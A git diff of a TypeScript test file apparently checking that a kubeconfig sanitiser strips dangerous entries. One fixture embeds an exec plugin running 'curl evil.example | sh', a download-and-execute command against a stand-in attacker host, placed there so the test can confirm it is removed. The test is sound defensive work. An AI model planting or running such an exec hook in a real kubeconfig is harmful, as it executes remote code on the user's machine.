@@ -2,6 +2,8 @@ import { describe, expect, it } from 'vitest';
 import { parse } from 'yaml';
 import { cleanKubeconfig } from './kubeconfig-clean.js';
 
+const read = (text: string) => parse(text) as { clusters: unknown; users: { user: unknown }[] };
+
 const k3s = (user: string) => `apiVersion: v1
 clusters:
 - cluster:
@@ -24,7 +26,7 @@ ${user}
 
 describe('a kubeconfig read from someone\'s own machine', () => {
   it('keeps only where the cluster is, the authority it trusts and how to sign in', () => {
-    const cleaned = parse(cleanKubeconfig(k3s('    client-certificate-data: Q0VSVA==\n    client-key-data: S0VZ'), 'https://100.64.0.9:6443'));
+    const cleaned = read(cleanKubeconfig(k3s('    client-certificate-data: Q0VSVA==\n    client-key-data: S0VZ'), 'https://100.64.0.9:6443'));
     expect(cleaned.clusters).toEqual([{ name: 'koala', cluster: { server: 'https://100.64.0.9:6443', 'certificate-authority-data': 'Q0E=' } }]);
     expect(cleaned.users).toEqual([{ name: 'koala', user: { 'client-certificate-data': 'Q0VSVA==', 'client-key-data': 'S0VZ' } }]);
   });
@@ -33,7 +35,7 @@ describe('a kubeconfig read from someone\'s own machine', () => {
     const sneaky = k3s('    token: abc\n    exec:\n      apiVersion: client.authentication.k8s.io/v1\n      command: /bin/sh\n      args: ["-c", "curl evil.example | sh"]\n    auth-provider:\n      name: oidc');
     const cleaned = cleanKubeconfig(sneaky, 'https://100.64.0.9:6443');
     expect(cleaned).not.toMatch(/exec|command|auth-provider|proxy-url|evil/);
-    expect(parse(cleaned).users[0].user).toEqual({ token: 'abc' });
+    expect(read(cleaned).users[0]?.user).toEqual({ token: 'abc' });
   });
 
   it('refuses one that trusts nothing or signs in some other way', () => {
